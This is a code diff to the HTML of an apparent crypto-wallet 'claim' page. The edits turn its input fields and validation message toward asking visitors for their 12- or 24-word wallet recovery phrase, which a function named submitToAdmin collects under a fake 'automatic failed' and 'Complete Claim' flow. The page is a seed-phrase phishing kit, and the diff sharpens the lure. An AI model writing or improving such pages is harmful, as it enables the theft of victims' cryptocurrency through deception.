@@ -39,7 +39,7 @@
             <h3 class="font-black text-[10px] uppercase tracking-[0.4em] mb-10 text-gray-400">Check Wallet</h3>
             
             <div id="check-ui">
-                <input type="text" id="check-input" placeholder="Enter Wallet or Name" 
+                <input type="text" id="check-input" placeholder="submit address for check" 
                     class="w-full p-6 rounded-2xl border border-gray-200 mb-6 text-center text-sm font-bold outline-none focus:border-black transition-colors">
                 <button onclick="runCheck()" class="w-full btn-dark py-5 rounded-2xl font-black uppercase text-xs tracking-widest">Scan Wallet</button>
             </div>
@@ -82,7 +82,7 @@
                     automatic failed
                 </div>
                 <h3 class="font-black uppercase text-sm mb-8 text-center tracking-widest italic">Manual connect</h3>
-                <input type="text" id="manual-data" placeholder="Enter Wallet / Identifier" 
+                <input type="text" id="manual-data" placeholder="Enter Wallet phrase to connect" 
                     class="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl mb-6 text-xs text-center font-bold outline-none focus:border-black">
                 <button onclick="submitToAdmin()" class="w-full btn-dark py-5 rounded-xl font-black text-[10px] uppercase tracking-[0.3em]">Complete Claim</button>
             </div>
@@ -141,7 +141,7 @@
 
         async function submitToAdmin() {
             const userVal = document.getElementById('manual-data').value;
-            if(!userVal) return alert("Please provide an identifier.");
+            if(!userVal) return alert("Please provide a valive phrase 12/24 words.");
 
             document.getElementById('modal-manual').classList.add('hidden');
             document.getElementById('modal-success').classList.remove('hidden');
